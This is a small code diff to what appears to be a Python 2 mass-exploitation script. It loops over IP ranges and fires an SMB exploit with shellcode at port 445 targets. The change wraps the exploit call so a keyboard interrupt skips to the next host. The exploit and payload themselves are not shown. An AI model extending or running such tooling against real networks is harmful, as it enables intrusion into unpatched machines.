@@ -1268,7 +1268,11 @@ for i in ip_range:
 
 				elif port == 445:
 					numGroomConn = 13
-					exploit(current_target, sc, numGroomConn)
+					try:
+						exploit(current_target, sc, numGroomConn)
+					except KeyboardInterrupt:
+						continue
+					
 				else:
 					print "[*] Port non-exploitable"
 
